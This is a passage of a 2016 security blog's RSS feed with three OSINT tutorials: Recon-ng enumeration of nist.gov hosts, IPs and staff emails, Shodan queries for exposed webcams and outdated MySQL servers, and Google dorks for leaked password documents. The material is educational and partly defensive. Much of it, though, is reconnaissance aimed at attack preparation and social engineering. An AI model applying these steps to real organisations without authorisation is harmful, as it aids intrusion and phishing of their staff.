[*] [host] scap.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] patapsco.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] nvd.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] kinetics.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] srdata.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] www.cftt.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] cccbdb.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] museum.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] thermosymposium.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] www.atp.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] www.ctcms.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] usgcb.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] www.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] trecvid.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] stonewall.nist.gov (&amp;lt;blank&amp;gt;)
.......................................
-------
SUMMARY
-------
[*] 73 total (73 new) hosts found.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In this case we discovered 73 hosts related to the domain; we can show the list of discovered host:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][google_site_web] &amp;gt; show hosts

  +-----------------------------------------------------------------------------------------------------------------+
  | rowid |              host              | ip_address | region | country | latitude | longitude |      module     |
  +-----------------------------------------------------------------------------------------------------------------+
  | 1     | www.nsrl.nist.gov              |            |        |         |          |           | google_site_web |
  | 2     | gams.nist.gov                  |            |        |         |          |           | google_site_web |
  | 3     | physics.nist.gov               |            |        |         |          |           | google_site_web |
  | 4     | face.nist.gov                  |            |        |         |          |           | google_site_web |
  | 5     | scap.nist.gov                  |            |        |         |          |           | google_site_web |
  | 6     | patapsco.nist.gov              |            |        |         |          |           | google_site_web |
  | 7     | nvd.nist.gov                   |            |        |         |          |           | google_site_web |
  | 8     | kinetics.nist.gov              |            |        |         |          |           | google_site_web |
  | 9     | srdata.nist.gov                |            |        |         |          |           | google_site_web |
  | 10    | www.cftt.nist.gov              |            |        |         |          |           | google_site_web |
  | 11    | cccbdb.nist.gov                |            |        |         |          |           | google_site_web |
  | 12    | museum.nist.gov                |            |        |         |          |           | google_site_web |
  | 13    | thermosymposium.nist.gov       |            |        |         |          |           | google_site_web |
  | 14    | www.atp.nist.gov               |            |        |         |          |           | google_site_web |
  | 15    | www.ctcms.nist.gov             |            |        |         |          |           | google_site_web |
  | 16    | usgcb.nist.gov                 |            |        |         |          |           | google_site_web |
  | 17    | www.nist.gov                   |            |        |         |          |           | google_site_web |
  | 18    | trecvid.nist.gov               |            |        |         |          |           | google_site_web |
  | 19    | stonewall.nist.gov             |            |        |         |          |           | google_site_web |
.....................................................................................................................
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As the table shows, we have empty columns ready to store additional informations for each host: these can be populated by hand or by running other modules using host informations we just gathered:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][google_site_web] &amp;gt; search hosts-
[*] Searching for &#39;hosts-&#39;...

  Recon
  -----
    recon/hosts-domains/migrate_hosts
    recon/hosts-hosts/bing_ip
    recon/hosts-hosts/freegeoip
    recon/hosts-hosts/ipinfodb
    recon/hosts-hosts/resolve
    recon/hosts-hosts/reverse_resolve
    recon/hosts-hosts/ssltools
    recon/hosts-locations/migrate_hosts
    recon/hosts-ports/shodan_ip
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We can find IP addresses for each host by running &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/hosts-hosts/resolve&lt;/code&gt; module, while the geolocation can be acquired with &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/hosts-hosts/freegeoip&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][freegeoip] &amp;gt; show hosts 

  +------------------------------------------------------------------------------------------------------------------------------------------+
  | rowid |              host              |   ip_address  |         region         |    country    | latitude | longitude |      module     |
  +------------------------------------------------------------------------------------------------------------------------------------------+
  | 1     | www.nsrl.nist.gov              | 129.6.24.57   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 2     | gams.nist.gov                  | 129.6.24.27   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 3     | physics.nist.gov               | 129.6.13.152  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 4     | face.nist.gov                  | 132.163.4.217 | Boulder, Colorado      | United States | 39.9668  | -105.2092 | google_site_web |
  | 5     | scap.nist.gov                  | 129.6.13.177  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 6     | patapsco.nist.gov              | 129.6.13.93   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 7     | nvd.nist.gov                   | 129.6.13.177  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 8     | kinetics.nist.gov              | 129.6.24.48   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 9     | srdata.nist.gov                | 129.6.13.111  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 10    | www.cftt.nist.gov              | 129.6.24.57   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 11    | cccbdb.nist.gov                | 129.6.13.59   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 12    | museum.nist.gov                | 129.6.13.111  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 13    | thermosymposium.nist.gov       | 132.163.4.124 | Boulder, Colorado      | United States | 39.9668  | -105.2092 | google_site_web |
  | 14    | www.atp.nist.gov               | 132.163.4.217 | Boulder, Colorado      | United States | 39.9668  | -105.2092 | google_site_web |
  | 15    | www.ctcms.nist.gov             | 129.6.24.51   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 16    | usgcb.nist.gov                 | 129.6.13.177  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 17    | www.nist.gov                   | 132.163.4.18  | Boulder, Colorado      | United States | 39.9668  | -105.2092 | google_site_web |
  | 18    | trecvid.nist.gov               | 132.163.4.217 | Boulder, Colorado      | United States | 39.9668  | -105.2092 | google_site_web |
  | 19    | stonewall.nist.gov             | 129.6.13.93   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
..............................................................................................................................................
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As shown, in minutes we have acquired tons of informations about target hosts.&lt;br /&gt;
Now we can lower the search level by digging even deeper: what about looking for contact informations such as names and email addresses?
We can achieve this objective by running &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/domains-contacts/pgp_search&lt;/code&gt;: in fact as the description reports, this module searches the MIT public PGP key server for email addresses of the given domain. After module has been executed, we can display results stored in the DB (of course names and addresses in the following table are fictional for privacy reasons):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][pgp_search] &amp;gt; show contacts

  +----------------------------------------------------------------------------------------------------------------------------------------------+
  | rowid |   first_name  | middle_name |    last_name     |             email             |        title        | region | country |   module   |
  +----------------------------------------------------------------------------------------------------------------------------------------------+
  | 1     | Bugs          |             | Bunny            | bugs.bunny@nist.gov           | PGP key association |        |         | pgp_search |
  | 2     | Foghorn       |             | Leghorn          | foghorn.leghorn@nist.gov      | PGP key association |        |         | pgp_search |
  | 3     | Daffy         |             | Duck             | daffy.duck@nist.gov           | PGP key association |        |         | pgp_search |

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This is not over yet: we can also search if those contacts have been involved in a databreach, like Adobe one in 2013. For this purpose there are two interesting modules, &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/contacts-credentials/hibp_breach&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/contacts-credentials/hibp_paste&lt;/code&gt;: the first one leverages haveibeenpwned.com API to determine if email addresses are associated with breached credentials, while the other one uses the API to determine if email addresses have been published to various paste sites.&lt;/p&gt;

&lt;p&gt;You can check if your email address has been compromised in data breaches by simply going on the &lt;em&gt;Have I Been Pwned?&lt;/em&gt; (HIBP) website and launching a search. This service collects and analyzes database dumps and pastes leaked by data breaches happened over the years regarding millions of accounts.&lt;/p&gt;

&lt;p&gt;All these informations can be useful during next phases of the attack, especially for Social Engineering (we will look into this technique in future articles).&lt;/p&gt;

&lt;p&gt;Once collected enough informations, it is useful to report them in a document. Fortunately, Recon-ng offers modules to report results in different formats:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST] &amp;gt; show modules reporting

  Reporting
  ---------
    reporting/csv
    reporting/html
    reporting/json
    reporting/list
    reporting/pushpin
    reporting/xlsx
    reporting/xml
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;For example, we can choose to save the returns in an HTML page file:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST] &amp;gt; use reporting/html
[recon-ng][NIST][html] &amp;gt; show options

  Name      Current Value                                 Required  Description
  --------  -------------                                 --------  -----------
  CREATOR                                                 yes       creator name for the report footer
  CUSTOMER                                                yes       customer name for the report header
  FILENAME  /root/.recon-ng/workspaces/NIST/results.html  yes       path and filename for report output
  SANITIZE  True                                          yes       mask sensitive data in the report

[recon-ng][NIST][html] &amp;gt; set CREATOR Spread Security
CREATOR =&amp;gt; Spread Security
[recon-ng][NIST][html] &amp;gt; set CUSTOMER NIST
CUSTOMER =&amp;gt; NIST
[recon-ng][NIST][html] &amp;gt; run
[*] Report generated at &#39;/root/.recon-ng/workspaces/NIST/results.html&#39;.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Results can be then visualized using a common web browser:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/recon-ng/recon-ng_report.png&quot;&gt;&lt;img src=&quot;/images/recon-ng/recon-ng_report.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusions&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Recon-ng is a valuable framework for reconnaissance which has a really good system for storing and managing data for later use.&lt;br /&gt;
We have seen only a small part of its real capabilities, so take your time to explore and experiment with it to take advantage of its true power.&lt;/p&gt;
</description>
        <pubDate>Mon, 01 Aug 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/08/01/open-source-web-reconnaissance-with-recon-ng.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/08/01/open-source-web-reconnaissance-with-recon-ng.html</guid>
        
        <category>Information gathering</category>
        
        <category>OSINT</category>
        
        <category>Recon-ng</category>
        
        
      </item>
    
      <item>
        <title>Information Gathering with Shodan</title>
        <description>&lt;p&gt;Today a large number of devices are connected to Internet, from smartphones or watches to air-conditioning devices or even refrigerators: this is what has been called “Internet of Things” (IoT), i.e. the network composed by physical devices collecting and exchanging data between themselves.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/shodan/IoT.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Of course, a wrong configuration of these devices can generate serious problems in terms of privacy.&lt;br /&gt;
The simplest example is given by private webcams, or better what they are intended to be: in fact, if they are set to have a public IP address and have not been secured properly, they can be accessed from anywhere in the world by anyone.&lt;br /&gt;
Moreover, even if configured to request login credentials, many of them still have default access values, which can be easily acquired by reading user manual.&lt;br /&gt;
Generally, depending from the webcam model, the web control interface has a default page title and a defined pattern in the url used for browser access (the only difference will be the IP address). So, once we know the title or the url pattern for a specific model, we can generate a Google query to search all the devices of that type exposed on the Internet with the same technique used in the previous article.&lt;br /&gt;
An example is given by this simple query which exploits the web console interface title:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;intitle:&quot;Live View / - AXIS&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In this way we can find all webcams from AXIS manufacturer with a public IP address indexed by Google.&lt;/p&gt;

&lt;p&gt;However, there is a really powerful search engine for the IoT called &lt;em&gt;Shodan&lt;/em&gt; that makes all the hard work for us: https://www.shodan.io&lt;/p&gt;

&lt;p&gt;&lt;b&gt;The search engine for the Internet of Things&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;The description in the website says that Shodan is the world’s first search engine for Internet-connected devices:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/shodan/shodan.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here it is possible to look for industrial control systems, databases, video games servers, routers, webcams, refrigerators and so on; in fact, mainly using banner grabbing technique by interrogating ports, Shodan is able to discover a lot of informations about publicly exposed devices. This is the big difference between Google and Shodan: while the first one crawls for data on web pages, the latter probes for ports and captures resulting banners.&lt;/p&gt;

&lt;p&gt;We can either use directly the search form or use the Explore button for a guided search through the available categories using predefined queries.
I highly suggest to register to the site in order to gain access to features like &lt;em&gt;filters&lt;/em&gt; and &lt;em&gt;reports&lt;/em&gt; (including the API key).&lt;/p&gt;

&lt;p&gt;Suppose we want to search for AXIS devices, we compile the search form and launch the query:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/axis.png&quot;&gt;&lt;img src=&quot;/images/shodan/axis.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The above image shows the results page; on the left side of the screen we have five interesting groups (they change depending on the query):&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;Top countries;&lt;/li&gt;
	&lt;li&gt;Top services;&lt;/li&gt;
	&lt;li&gt;Top organizations;&lt;/li&gt;
	&lt;li&gt;Top operating systems;&lt;/li&gt;
	&lt;li&gt;Top products.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each of them reports the top five; for example, the first one shows the top five countries having the major number of devices of that type.
On the right side, each result is reported with the corresponding device IP address (which I have partially blacked out for privacy reasons) and the &lt;em&gt;body text area&lt;/em&gt; which represents device response. By clicking on a device a new page opens up with more detailed informations, including a map showing the geolocation using Mapbox API (omitted in the next image).&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/axis_detail.png&quot;&gt;&lt;img src=&quot;/images/shodan/axis_detail.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Moreover, it is possible to generate reports by clicking on “Create Report”:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/top_countries.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_countries.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_services.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_services.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_organizations.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_organizations.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_products.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_products.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_versions.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_versions.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_domains.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_domains.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/ssl_versions.png&quot;&gt;&lt;img src=&quot;/images/shodan/ssl_versions.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/ssl_chain_lenght.png&quot;&gt;&lt;img src=&quot;/images/shodan/ssl_chain_lenght.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_operating_systems.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_operating_systems.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The other important feature is represented by filters; they are really useful to improve the search, just like we saw for Google advanced search operators. Some of them are reported next:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;country - filters by two letters country code (e.g. US, JP, FR, IT, RU);&lt;/li&gt;
	&lt;li&gt;city - filters by city name;&lt;/li&gt;
	&lt;li&gt;hostname - filters by hostname or domain;&lt;/li&gt;
	&lt;li&gt;net - filters by IP range (CIDR notation);&lt;/li&gt;
	&lt;li&gt;product - filters by technology (es. MySQL, Apache, IIS, Nginx);&lt;/li&gt;
	&lt;li&gt;os - filters by operating system;&lt;/li&gt;
	&lt;li&gt;port - filters by specific port;&lt;/li&gt;
	&lt;li&gt;org - filters by organization;&lt;/li&gt;
	&lt;li&gt;geo - filters by geographic coordinates;&lt;/li&gt;
	&lt;li&gt;after/before - filters by date (format dd/mm/yyyy and dd-mm-yy).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The application of filters can be done by clicking on the items on the left contained in the top five groups seen before or manually in the search form by specifying the query in this way (example search for SSH port):&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;port:22
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Remember that making a search without filters, it is equivalent to tell to the engine to look for the requested information in the body text area.&lt;/p&gt;

&lt;p&gt;If we want to find all MySQL servers in USA, the query will be:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;product:&quot;MySQL&quot; country:&quot;US&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;On the left side of the results page we get two interesting groups: top operating systems and top versions.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/mysql_us.png&quot;&gt;&lt;img src=&quot;/images/shodan/mysql_us.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;They can be used to apply other two filters; for example, we can choose to search for old Windows XP operating systems (!) and then 5.1.71-community version of MySQL (this version appears on the left after filtering by O.S.):&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;country:&quot;US&quot; product:&quot;MySQL&quot; os:&quot;Windows XP&quot; version:&quot;5.1.71-community&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;There is also an interesting application, available at https://maps.shodan.io, through which we can even look at a map with pinpoints indicating the geolocation of devices, in this case public MySQL servers in USA:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/shodan_maps.png&quot;&gt;&lt;img src=&quot;/images/shodan/shodan_maps.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In terms of Industrial Control Systems (ICS), Shodan has also a pretty nice informative animated graph called Shodan ICS Radar showing a worldwide display of ICS accessible via web:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/ics_radar.png&quot;&gt;&lt;img src=&quot;/images/shodan/ics_radar.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I suggest to experiment with filters of all types to get familiar with queries and take advantage of the full potential of this search engine. Shodan can be a very useful tool to verify if a company network has critical nodes publicly exposed or not properly configured.&lt;/p&gt;

&lt;p&gt;Bonus query:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;has_screenshot:true
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 25 Jul 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/07/25/information-gathering-with-shodan.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/07/25/information-gathering-with-shodan.html</guid>
        
        <category>Information gathering</category>
        
        <category>Shodan</category>
        
        <category>IoT</category>
        
        <category>OSINT</category>
        
        
      </item>
    
      <item>
        <title>Information Gathering with Google Search Engine</title>
        <description>&lt;p&gt;Generally, when we want to search for a particular argument, we open up our favourite browser, navigate to a Web Search Engine and type in some words related to that matter. Depending from how good we set up the research, we obtain more or less pertinent results.&lt;/p&gt;

&lt;p&gt;Basically, everytime we launch a search we make a query to the web search engine: there are some particular expressions known to the engine, called Advanced Search Operators, which make a search more effective. Queries built like these are also called “Google dorks”.&lt;br /&gt;
&lt;!--more--&gt;
For example, we can make a simple search for “cyber security” using Google Search Engine:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/google_search/google_search.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By doing this we obtain a good amount of informations about the argument; note that we could achieve the same result by using the following url instead of compiling the search form:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.google.com/search?q=cyber+security
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;b&gt;Google Advanced Search Operators and Special Search Characters&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;What if we want to do a more specific query, like obtaining all the results for that topic from a particular website? Here come advanced search operators.
Suppose we want to analyze results coming from NIST (National Institute of Standards and Technology) for that topic; then the query should be:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;site:nist.gov &quot;cyber security&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The operator “site:” asks to the engine to show all the results associated to the website (which represent the argument of the operator) reported after the colon symbol; beware that there must be no space between the colon symbol and the argument of the operator.
In addition to search operators, there are special search characters like the double quotes used before to search phrases or terms composed by more than one word.&lt;/p&gt;

&lt;p&gt;A pretty good list of Google advanced search operators is this one from DEFCON 2005 Conference:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/google_search/google_search_operators.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;List for special search characters:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;( + ) force inclusion of something common;&lt;/li&gt;
  &lt;li&gt;( - ) exclude a search term;&lt;/li&gt;
  &lt;li&gt;( &quot; ) use quotes around search phrases;&lt;/li&gt;
  &lt;li&gt;( . ) a single-character wildcard;&lt;/li&gt;
  &lt;li&gt;( * ) any word;&lt;/li&gt;
  &lt;li&gt;( &amp;amp; ) boolean &#39;AND&#39;;&lt;/li&gt;
  &lt;li&gt;( | ) boolean &#39;OR&#39;;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The special char “-“ is really interesting for listing subdomains. Considering the next query we obtain a list of the subdomains of nist.gov:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/google_search/nist_search.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Adding more “-“ condition allows to crawl even deeper: keep in mind that Google ranks the results, so the most searched stuff lies at the top, i.e. in the first pages, while the most interesting informations (from an attacker point of view) can be found at the bottom.&lt;/p&gt;

&lt;p&gt;Now we will look for something more interesting in terms of confidential informations; suppose we want to know if in a certain website there is a PDF document containing the word “password”. For this purpose, we query Google with the following request:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;site:www.nameoftargetsite.com filetype:pdf intext:password
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The meaning of the previous line is explained next: the first operator is well known; the “filetype:” directive tells Google we want to search all the files with a particular extension, in this case PDF. Lastly, we add a third condition which makes the engine search for a specific word in the text.
So, interpreting the whole query: we are asking to search through the site www.nameoftargetsite.com all PDF documents containing the word “password”.&lt;/p&gt;

&lt;p&gt;You can easily see how powerful this syntax is and you will be surprised by discovering the amount of confidential informations left to public access.
This is why it is important to configure properly the access to informations hosted on the net, for example in a website. However, if not really needed, it is a good practice to avoid hosting of confidential documents on websites, since they are the first contact point for attackers.&lt;/p&gt;

&lt;p&gt;If you want to take a look at a really good list of Google dorks I suggest you to visit the following website:
https://www.exploit-db.com/google-hacking-database&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/google_search/ghdb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here you can search through the Google Hacking DataBase choosing the query category you are interested in and then simply use it to search through Google.
Keep in mind that this type of information gathering through search engine is a passive reconnaissance activity since we are not interacting directly with the systems; this helps to maintain a low profile making hard to be detected.&lt;/p&gt;

&lt;p&gt;All these search activities can be executed by using automatic tools, which leverage not only Google, but a huge variety of search engines and social network platforms; we will take a look at some of them in the next posts.&lt;/p&gt;
</description>
        <pubDate>Mon, 18 Jul 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/07/18/information-gathering-with-google-search-engine.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/07/18/information-gathering-with-google-search-engine.html</guid>
        
        <category>Information gathering</category>
        
        <category>Google advanced search operators</category>
        
        <category>OSINT</category>
        
        
      </item>
    
  </channel>
</rss>

